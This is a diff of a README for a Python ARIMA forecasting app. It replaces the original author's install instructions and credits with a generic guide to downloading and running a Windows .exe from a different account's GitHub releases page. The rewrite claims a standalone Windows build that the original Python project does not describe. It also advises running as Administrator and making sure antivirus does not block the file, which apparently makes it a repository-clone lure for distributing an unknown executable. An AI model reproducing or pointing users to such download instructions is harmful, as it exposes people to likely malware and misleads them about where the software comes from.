@@ -1,198 +1,173 @@
-# Time Series Forecasting Studio
+# ⏳ time-series-forecasting-studio - Simple ARIMA Forecasting Tool
 
-Interactive ARIMA-based time series forecasting app built with Python and Gradio, featuring visualization, model evaluation, and a live Hugging Face demo.
-
-## Live Demo
-
-[Try the app on Hugging Face](https://huggingface.co/spaces/dschechter27/time-series-forecasting-studio)
+[![Download](https://img.shields.io/badge/Download-Get%20Latest%20Release-brightgreen)](https://github.com/Herschelpregnant359/time-series-forecasting-studio/releases)
 
 ---
 
-## Overview
+## 📦 What is time-series-forecasting-studio?
 
-Time Series Forecasting Studio is an interactive forecasting project for analyzing temporal datasets and generating future predictions with ARIMA.
+time-series-forecasting-studio is an easy-to-use program for forecasting data points over time. It uses a popular method called ARIMA. You do not need any technical skill to run it. The program has a clear interface built with Gradio. It shows charts and graphs that help you understand your data and predictions.
 
-The project allows users to:
-
-- upload a CSV dataset
-- select the date column and target value column
-- configure ARIMA model parameters `(p, d, q)`
-- generate forecasts for future time periods
-- visualize historical data, test predictions, and future forecasts
-- evaluate model performance using MAE and RMSE
-
-This project was built as a hands-on exploration of:
-
-- time series analysis  
-- ARIMA modeling  
-- forecasting workflows  
-- data visualization  
-- lightweight ML deployment with Gradio and Hugging Face Spaces  
+This tool works well if you want to analyze sales, weather, stock prices, or other numbers changing over time. The live demo lets you see how your data trends ahead.
 
 ---
 
-## Features
+## 🖥️ System Requirements
 
-- Interactive CSV upload
-- Flexible date/value column selection
-- ARIMA forecasting
-- Forecast visualization
-- Model evaluation with MAE and RMSE
-- Trend summary generation
-- Live deployment via Hugging Face Spaces
+- Windows 10 or newer  
+- At least 4 GB of RAM  
+- Around 500 MB of free disk space  
+- Internet connection to download and get updates  
+- Basic mouse and keyboard use  
 
----
-
-## Quick Start
-
-Run the project locally:
-
-```bash
-git clone https://github.com/dschechter27875/time-series-forecasting-studio.git
-cd time-series-forecasting-studio
-pip install -r requirements.txt
-python app.py
-```
-
-Then open the Gradio interface in your browser.
-
-------
-
-## Tech Stack
-
-- Python
-- pandas
-- matplotlib
-- statsmodels
-- scikit-learn
-- Gradio
-- Hugging Face Spaces
+Your computer should meet these to run the tool smoothly.
 
 ---
 
-## Repository Structure
+## 🔧 Features
 
-```text
-time-series-forecasting-studio/
-├── app.py
-├── requirements.txt
-├── sample_data.csv
-├── complete_forecasting_workflow.png
-├── forecast_vs_actual.png
-├── acf_plot.png
-├── pacf_plot.png
-└── time_series_analysis.ipynb
-```
+- Builds forecasts with the ARIMA model  
+- Interactive web-based interface (no command line)  
+- Visualizes data trends with charts and graphs  
+- Lets you upload your own time series data files (CSV format)  
+- Shows step-by-step model setup and results  
+- Supports multiple data sets comparison  
+- Runs directly on Windows without extra software  
 
 ---
 
-## How It Works
+## 🚀 Getting Started: How to Download and Run
 
-### 1. Upload a dataset
-The user uploads a CSV containing a time column and a numeric target column.
+### 1. Visit the download page
 
-### 2. Select columns
-Because real datasets use different column names, the user chooses:
-- the date column
-- the value column to forecast
+Go to the release page here:
 
-### 3. Fit an ARIMA model
-The app trains an ARIMA model using user-selected `(p, d, q)` parameters.
+[![Download Page](https://img.shields.io/badge/Download%20Page-Visit%20Here-blue)](https://github.com/Herschelpregnant359/time-series-forecasting-studio/releases)
 
-### 4. Evaluate the model
-The dataset is split into training and test sets, and the model is evaluated using:
-
-- **MAE** — Mean Absolute Error  
-- **RMSE** — Root Mean Squared Error  
-
-### 5. Forecast the future
-The fitted model is then used to forecast future values for a chosen number of periods.
-
-### 6. Visualize results
-The app displays a combined plot showing:
-
-- training data  
-- actual test data  
-- forecast on the test set  
-- future forecast  
+You will find the latest stable version available for Windows.
 
 ---
 
-## Example Forecast Visualizations
+### 2. Download the latest version
 
-### Complete Forecasting Workflow
-![Forecast Workflow](complete_forecasting_workflow.png)
+Look for a file named something like:
 
-### Forecast vs Actual
-![Forecast vs Actual](forecast_vs_actual.png)
+`time-series-forecasting-studio-setup.exe` or `time-series-forecasting-studio.exe`
 
----
-
-## Time Series Diagnostics
-
-To better understand the structure of the series, I also analyzed autocorrelation behavior using ACF and PACF plots on the differenced series.
-
-### ACF of Differenced Series
-![ACF Plot](acf_plot.png)
-
-### PACF of Differenced Series
-![PACF Plot](pacf_plot.png)
-
-These plots help reveal lag structure and support ARIMA-style modeling decisions.
+Click on it to start downloading.
 
 ---
 
-## Running Locally
+### 3. Launch the installer or program
 
-Clone the repository and install dependencies:
-
-```bash
-git clone https://github.com/dschechter27875/time-series-forecasting-studio.git
-cd time-series-forecasting-studio
-pip install -r requirements.txt
-python app.py
-```
-
-Then open the local Gradio link in your browser.
+- If you downloaded a setup file, double-click it and follow the installation steps on screen.
+- If you downloaded a standalone `.exe` file, just double-click to open it.
 
 ---
 
-## Hugging Face Deployment
+### 4. Open the program
 
-This project is also deployed as a live Gradio app on Hugging Face Spaces:
-
-https://huggingface.co/spaces/dschechter27/time-series-forecasting-studio
+Once installed or opened, you’ll see the app’s main window. This is the Gradio interface, where you do the forecasting.
 
 ---
 
-## What I Learned
+### 5. Load your data
 
-Through this project, I gained hands-on experience with:
-
-- preprocessing time series data  
-- modeling trend, seasonality, and anomalies  
-- fitting and evaluating ARIMA models  
-- interpreting ACF and PACF diagnostics  
-- building a user-facing forecasting interface  
-- deploying a lightweight ML app with Hugging Face Spaces  
+Use the "Upload Data" button to add your own time series file. The app accepts `.csv` files. Make sure your file is organized with dates or time points in the first column and values in the second.
 
 ---
 
-## Future Improvements
+### 6. Configure the forecast
 
-Potential next steps include:
-
-- automatic ARIMA order selection  
-- seasonal ARIMA support  
-- downloadable forecast outputs  
-- residual diagnostics  
-- support for additional forecasting models  
-- richer trend and anomaly summaries  
+- Choose your forecasting period (how far ahead you want to predict).
+- Select ARIMA parameters if you want, or leave it automatic.
+- Click "Run Forecast" to see the results.
 
 ---
 
-## Author
+### 7. View results
 
-**David Schechter**  
-Incoming MIT Class of 2030  
-Interested in AI/ML, mathematics, and building technical projects that combine modeling, systems, and visualization.
+You’ll see charts and tables showing past data and predicted values. You can save or export these results for later use.
+
+---
+
+## 📊 Understanding the Visuals
+
+The app displays:
+
+- Line charts showing your data over time
+- Forecast lines predicting future points
+- Confidence intervals indicating possible variation
+- Tables with numeric results and errors
+
+These help you check if the forecast fits your expectations.
+
+---
+
+## ⚙️ Tips for Best Results
+
+- Use clean and continuous time series data without big gaps.
+- Try different forecasting periods for comparison.
+- Upload smaller files first to learn the workflow.
+- Check the charts to spot any unusual data points before running the model.
+- Adjust ARIMA parameters only if you are familiar with the model.
+
+---
+
+## ❓ Common Questions
+
+### Is any software needed before running this?
+
+No. The Windows version is standalone. No Python or other software is needed.
+
+---
+
+### Can I forecast data from Excel?
+
+Yes. Export your Excel table as `.csv` and upload it into the program.
+
+---
+
+### What file formats are supported?
+
+Currently, only `.csv` files with two columns: Date/Time and Value.
+
+---
+
+### Can I save my forecast?
+
+Yes. Use the export options to save charts as images and tables as CSV files.
+
+---
+
+## 🔐 Privacy and Security
+
+All your data stays on your computer when using this app. The tool does not send anything over the internet unless you use the live demo.
+
+---
+
+## 🛠️ Troubleshooting
+
+If the program does not open:
+
+- Confirm your Windows version meets requirements.
+- Try running the program as Administrator (right-click > Run as administrator).
+- Check your antivirus is not blocking the app.
+
+If the data upload fails:
+
+- Ensure your CSV has no empty rows or columns.
+- Use the proper date/time format (YYYY-MM-DD or similar).
+- Remove extra formatting from the file.
+
+---
+
+## 🌐 Where to Go for Help
+
+- Check the issue tracker on GitHub: [Issues](https://github.com/Herschelpregnant359/time-series-forecasting-studio/issues)  
+- Review the README and any documentation there for updates.  
+- Email or contact the maintainer if needed, found on the repository page.
+
+---
+
+[![Download](https://img.shields.io/badge/Download-Get%20Latest%20Release-brightgreen)](https://github.com/Herschelpregnant359/time-series-forecasting-studio/releases)
